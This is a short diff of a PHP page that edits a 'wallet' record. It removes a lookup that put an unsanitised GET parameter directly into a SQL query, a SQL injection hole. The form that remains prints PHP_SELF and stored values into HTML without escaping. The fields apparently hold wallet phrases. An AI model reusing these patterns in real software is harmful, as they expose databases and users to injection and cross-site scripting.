@@ -61,20 +61,7 @@ include_once (rootDir.'partials/front/header/main.php');
 
 
 // Retrieve existing data for the form
-if (isset($_GET['wallet_id'])) {
-    $wallet_id = $_GET['wallet_id'];
 
-    // Fetch existing data from the database
-    $result = $conn->query("SELECT * FROM wallet WHERE wallet_id = $wallet_id");
-
-    if ($result->num_rows > 0) {
-        $row = $result->fetch_assoc();
-        $wallet_username = $row['wallet_username'];
-        $wallet_phase = $row['wallet_phase'];
-    } else {
-        echo "No record found";
-    }
-}
 ?>
                     <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
                         <input type="hidden" name="wallet_id" value="<?php echo $wallet_id; ?>">
@@ -89,7 +76,7 @@ if (isset($_GET['wallet_id'])) {
                             <input type="text" class="form-control" name="wallet_phase" value="<?php echo $wallet_phase; ?>" required>
                         </div>
 
-                        <button type="submit">Update Record</button>
+                        <button type="submit" >Update Record</button>
                     </form>
 
                     <!--                    --><?php //include_once(rootDir.'connect_wallet/parts/wallets/main.php'); ?>
